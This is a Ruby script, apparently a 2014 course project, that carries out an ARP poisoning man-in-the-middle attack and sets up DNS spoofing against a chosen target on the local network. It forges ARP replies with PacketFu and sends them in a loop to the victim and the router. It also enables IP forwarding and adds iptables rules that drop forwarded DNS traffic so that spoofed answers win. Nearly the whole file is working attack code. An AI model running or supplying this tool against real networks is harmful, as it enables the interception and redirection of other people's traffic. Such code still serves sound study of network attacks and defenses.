#################################################################
##
##      Script:    dnsSpoof.rb
##
##      Functions: begin
##                 runSpoof
##                 fixSpoof
##                 forgePacket
##                 start
##                 init
##
##      Date:      November 3rd, 2014
##
##      Designer:  Jake Miner
##
##      Programer: Jake Miner
##
##      Notes: This is a simple ARP poisoning and DNS Spoofing
##             application made in Ruby. It reads from spoof.dns
##             To determine the addresses to spoof.
##
#################################################################
#!/usr/bin/ruby
require 'rubygems'
require 'optparse'
require 'packetfu'
require 'thread'
require './gdns.rb'

#################################################################
##
##      Function:   init()
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  init()
##
##      Returns:    void
##
##      Notes:      Sets up the global variables through command 
##                  line arguments and ruby magic.
##
#################################################################
def init()
  $arp_packet_target #= PacketFu::ARPPacket.new()
  $arp_packet_router #= PacketFu::ARPPacket.new()
  $iface = ''   # interface to send/recieve from
  $tIP = ''        # target IP address
  $rIP = ''       # router IP address

  parser = OptionParser.new do |opts|
    opts.banner = "Usage: ruby dnsspoof -r routerIP -t targetIP -i interface"
    opts.on('-r n', 'Router IP Address') { |v| $rIP = v }
    opts.on('-t n', 'Target IP Address') { |v| $tIP = v }
    opts.on('-i n', 'Interface') { |v| $iface = v } 
  end.parse!

  parser.parse!

  if $rIP == '' or $tip == '' or $iface == ''
    puts parser
    exit(-1)
  end

  $info = Utils.whoami?( :iface => $iface)
  $sIP = $info[:ip_saddr]        # source IP address
  $sMac = $info[:eth_saddr]  # source mac address, eg, address to redirect victim to
  $tMac = Utils.arp($tIP, :iface => $iface)  # target mac address, eg, address to poison
  $rMac = Utils.arp($rIP, :iface => $iface)  # routers mac address
end

#################################################################
##
##      Function:   start
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  start()
##
##      Returns:    void
##
##      Notes:      Sends the arp poisioning packets to the 
##                  target and router, and sets up firewall for 
##                  forwarding between the two
##
#################################################################
def start()
  # tell the target that your mac address is the router
  $arp_packet_target = forgePacket($sMac, $tMac, $rIP, $tIP)
  $arp_packet_router = forgePacket($sMac, $rMac, $tIP, $rIP)
  `echo 1 > /proc/sys/net/ipv4/ip_forward`
  `iptables -A FORWARD -p UDP --dport 53 -j DROP`
  `iptables -A FORWARD -p TCP --dport 53 -j DROP`
end

#################################################################
##
##      Function:   forgePacket
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  forgePacket(sMac, tMac, tIP, rIP)
##                              sMac - The "sender" mac address 
##                              tMac - The target mac address
##                              tIP  - The "sender" ip addresss
##                              rIP  - The target ip address
##
##      Returns:    target -> the poisoned arp packet for the target
##
##      Notes:      Creates a posioned arp packet to be sent.
##
#################################################################
def forgePacket(sMac, tMac, tIP, rIP)
  target = PacketFu::ARPPacket.new()
  target.eth_saddr = sMac       # sender's MAC address
  target.eth_daddr = tMac       # targets MAC address
  target.arp_saddr_mac = sMac   # sender's MAC address
  target.arp_daddr_mac = tMac   # router's MAC address
  target.arp_saddr_ip = tIP     # target's IP
  target.arp_daddr_ip = rIP     # router's IP
  target.arp_opcode = 2         # arp code 2 == ARP reply
  return target
end

#################################################################
##
##      Function:   fixSpoof
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  fixSpoof()
##
##      Returns:    void
##
##      Notes:      Reverses the arp poisoning on the targets
##
#################################################################
def fixSpoof()
  $arp_packet_target = forgePacket($rMac, $tMac, $rIP, $tIP)
  $arp_packet_router = forgePacket($tMac, $rMac, $tIP, $rIP)
  3.times{ $arp_packet_target.to_w($iface) }
  3.times{ $arp_packet_router.to_w($iface) }
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
end

#################################################################
##
##      Function:   runSpoof
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  runSpoof()
##
##      Returns:    void
##
##      Notes:      Continuously sends posioned arp packets 
##                  to the router and the victim
##
#################################################################
def runSpoof()
  # Send out both packets
  caught=false
  while caught==false do
    $arp_packet_target.to_w($iface)
    $arp_packet_router.to_w($iface)
    sleep 3
  end
end

#################################################################
##
##      Function:   begin
##
##      Date:       November 3rd, 2014
##
##      Designer:   Jake Miner
##
##      Programer:  Jake Miner
##
##      Interface:  begin
##
##      Returns:    void
##
##      Notes:      The main method of the program
##
#################################################################
begin
  init()
  start()
  spoof_thread = Thread.new{runSpoof()} 
  dns_thread = Thread.new{dns_query_grabber} 
  spoof_thread.join
  dns_thread.join

  rescue Interrupt # Catch the interrupt and kill the threads, and fix the arps
    puts "\nARP spoof stopped by interrupt signal."
    Thread.kill(spoof_thread)
    Thread.kill(dns_thread)
    fixSpoof()
    `iptables -F`
  exit 0
end
